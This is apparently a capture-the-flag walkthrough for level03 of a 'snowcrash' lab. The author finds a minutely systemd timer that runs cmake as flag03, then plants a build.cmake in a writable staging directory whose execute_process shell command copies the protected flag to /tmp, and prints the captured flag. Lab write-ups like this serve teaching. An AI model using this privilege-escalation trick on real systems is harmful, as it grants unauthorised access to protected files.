as usual , cat the readme

```bash
level03@snowcrash:~$ cat README 
Every Burbclave has rules. Find the loophole.

level03@snowcrash:~$ find / -name "*burbclave*" 2>/dev/null
/var/lib/burbclave
/etc/systemd/system/burbclave.timer
/etc/systemd/system/burbclave.service
/etc/systemd/system/timers.target.wants/burbclave.timer
/etc/burbclave

level03@snowcrash:~$ find / -user flag03  2>/dev/null
/home/flag03
/etc/burbclave
/opt/snowcrash/level03/CMakeLists.txt

```

```bash
level03@snowcrash:~$ systemctl status burbclave.service
× burbclave.service - Burbclave build runner (one-shot)
     Loaded: loaded (/etc/systemd/system/burbclave.service; static)
     Active: failed (Result: exit-code) since Sat 2026-10-03 14:47:22 UTC; 14s ago
TriggeredBy: ● burbclave.timer
    Process: 14670 ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt (code=exited, statu>
   Main PID: 14670 (code=exited, status=1/FAILURE)
        CPU: 13ms
lines 1-7/7 (END)
^C
level03@snowcrash:~$ systemctl status burbclave.timer
● burbclave.timer - Burbclave build runner timer — runs every minute
     Loaded: loaded (/etc/systemd/system/burbclave.timer; enabled; preset: enabled)
     Active: active (waiting) since Sat 2026-10-03 12:13:07 UTC; 2h 34min ago
    Trigger: Sat 2026-10-03 14:48:22 UTC; 22s left
   Triggers: ● burbclave.service

Warning: some journal files were not opened due to insufficient permissions.

```
let's try to run cmake:

```bash
level03@snowcrash:~$ /usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
CMake Warning at /opt/snowcrash/level03/CMakeLists.txt:55 (message):
  BurbclaveRuntime is only validated on Linux


CMake Error at /opt/snowcrash/level03/CMakeLists.txt:63 (file):
  file failed to open for reading (Permission denied):

    /etc/burbclave/burbclave.conf

```

let;t cat the /opt/snowcrash/level03/CMakeLists.txt ang grep barbclave:

```bash
level03@snowcrash:~$ cat /opt/snowcrash/level03/CMakeLists.txt  | grep burbclave
set(BURBCLAVE_SOCKET_PATH       "/var/run/burbclave.sock")
set(BURBCLAVE_STATE_DIR         "/var/lib/burbclave")
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

```

### Getting to the malicious `build.cmake`

From the `CMakeLists.txt`, we see that the service extracts `runtime_base` and `workspace` from the protected configuration, then executes:

include(${RESOLVED_BUILD_PATH}/build.cmake)

This means the service is not only reading a configuration file; it eventually loads and executes a `build.cmake` file. Since the service runs as `flag03`, any CMake code inside that file will also run with `flag03`'s privileges.

I then investigated the Burbclave directories and found that `/var/lib/burbclave/staging` is writable by `level03`. This gives me control over the `build.cmake` file that the service will load.

So the idea is: **find the file the privileged CMake process includes → find where that file is expected to be → find a writable location → create our own `build.cmake` containing CMake code that executes a command.**

   ```bash
   echo 'execute_process(COMMAND /bin/sh -c "cat /home/flag03/.flag > /tmp/flag03_result")' > /var/lib/burbclave/staging/build.cmake
```
wait a  minute and cat the /tmp/flag03_result file

```bash
level03@snowcrash:/var/lib/burbclave/staging$ cat /tmp/flag03_result 
b209ea91ad7a5c2a0b0f4e195ca4

```